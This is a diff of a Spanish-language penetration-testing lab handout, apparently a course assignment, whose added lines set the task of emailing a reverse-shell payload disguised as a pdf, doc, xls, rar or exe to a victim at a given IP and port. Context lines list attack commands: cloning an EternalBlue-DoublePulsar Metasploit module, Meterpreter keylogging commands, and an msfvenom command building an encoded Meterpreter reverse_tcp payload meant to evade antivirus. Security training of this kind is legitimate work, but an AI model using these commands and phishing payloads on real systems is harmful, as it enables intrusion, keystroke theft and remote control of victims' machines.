@@ -35,6 +35,16 @@ de la victima con win7 spa1 updated + AV, una vez que el archivo llegue por emai
 mismoa tiempo ud debe ejecutar meterpreter de manera de captar el shell inverso que se genero una vez que la victima inicie
 el archivo enviado
 
+===============================================================================================
+
+El entregable del LAB es enviar por email un payload apuntando a la IP 192.168.30.149 puerto 1023
+
+este puede ser un archivo pdf, doc, xls, rar, exe
+
+Plazo entrega martes 27 de Nov.
+
+================================================================================================
+Comandos y scripts de Ayuda del LAB
 
 
 1.- cd /usr/share/nmap/scripts/
@@ -84,8 +94,7 @@ git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git
 31.- keyscan_start
 32.- keyscan_dump
 
-
-
+===================================================================================
 client side attack
 
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.151.189 LPORT=8888 -e x86/shikata_ga_nai -i 10 -f raw > eoncode.bin
